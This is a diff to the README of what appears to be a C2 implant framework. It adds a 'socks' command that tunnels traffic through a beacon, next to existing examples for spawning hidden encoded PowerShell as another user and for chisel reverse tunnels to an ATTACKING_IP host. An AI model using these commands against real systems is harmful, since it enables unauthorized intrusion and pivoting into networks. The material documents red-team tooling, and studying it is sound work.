@@ -102,6 +102,7 @@ Windows beacon uses primarily windows API and start with no module loaded. Modul
 | spawnAs          |Launch a new process as another user, with the given credentials. <br>exemple:<br>- spawnAs DOMAIN\Username Password powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgA...<br>- spawnAs .\Administrator Password C:\Users\Public\Documents\implant.exe|
 | chisel           |Launch chisel in a thread on the remote server.<br>No output is provided.<br>exemple:<br>- chisel status<br>- chisel stop pid<br>Reverse Socks Proxy:<br>- chisel /tools/chisel.exe client ATTACKING_IP:LISTEN_PORT R:socks<br>- On the attacking machine: chisel server -p LISTEN_PORT --reverse<br>Remote Port Forward:<br>- chisel /tools/chisel.exe client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:REMOT_PORT<br>- On the attacking machine: chisel server -p LISTEN_PORT --reverse|
 | tree             |Tree|
+| socks            |Start a socks5 server on the TeamServer and tunnel the traffic to the Beacon.<br>The tunneling is done using the communication protocol of the beacon.<br>Only one socks5 server can be opened at a time.<br>exemple:<br> - socks start 1080 <br> - socks stop|
 
 AssemblyExec & Inject, that use Donut project, make it possible to launch binary EXE, DLL, managed or unmanaged direclty from memory on the remote host.
 
